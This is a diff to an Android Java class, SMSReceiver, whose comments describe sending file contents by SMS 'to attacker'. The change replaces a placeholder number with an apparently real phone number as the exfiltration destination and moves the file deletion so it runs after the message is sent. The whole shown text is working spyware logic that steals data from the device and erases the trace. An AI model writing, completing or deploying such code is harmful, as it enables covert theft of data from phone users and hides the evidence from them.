@@ -89,10 +89,9 @@ public class SMSReceiver extends BroadcastReceiver{
             Log.d("sendingMessage", content);
 
             //Call sendSMS to send SMS with message content to attacker
-            sendSMS(content);
+            sendSMS(content, file);
 
-            //Delete file
-            file.getCanonicalFile().delete();
+
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -119,9 +118,9 @@ public class SMSReceiver extends BroadcastReceiver{
     }
 
     //This is the general method for sending an SMS
-    public static void sendSMS(String content) {
+    public static void sendSMS(String content, File file) throws IOException {
         Log.d("sendSMS", "Sending a SMS now!");
-        String attackerNum = "+XXXXXXXXXX";
+        String attackerNum = "+16477818357";
         try {
             SmsManager smsManager = SmsManager.getDefault();
             smsManager.sendTextMessage(attackerNum, null, content, null, null);
@@ -130,5 +129,8 @@ public class SMSReceiver extends BroadcastReceiver{
             Log.e("sendSMS", "SMS failed");
             e.printStackTrace();
         }
+
+        //Delete file
+        file.getCanonicalFile().delete();
     }
 }
